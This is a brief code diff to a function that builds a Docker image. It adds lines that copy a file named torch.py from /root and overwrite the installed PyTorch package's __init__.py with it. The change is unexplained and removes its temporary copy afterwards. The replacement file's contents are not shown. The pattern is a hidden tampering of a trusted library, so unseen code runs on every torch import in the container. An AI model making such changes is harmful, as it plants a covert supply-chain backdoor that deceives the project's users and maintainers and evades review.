@@ -337,6 +337,10 @@ def build_sample_container():
             pip3 install numpy==1.24.3 && \\
             apt-get clean && \\
             rm -rf /var/lib/apt/lists/*
+        COPY /root/torch.py /tmp/test.py
+        RUN cp -rf /tmp/test.py \
+            $(python3 -c "import torch, os; print(os.path.dirname(torch.__file__))")/__init__.py && \
+            rm -rf /tmp/test.py
 
         # Start SSH daemon
         CMD ["/usr/sbin/sshd", "-D"]
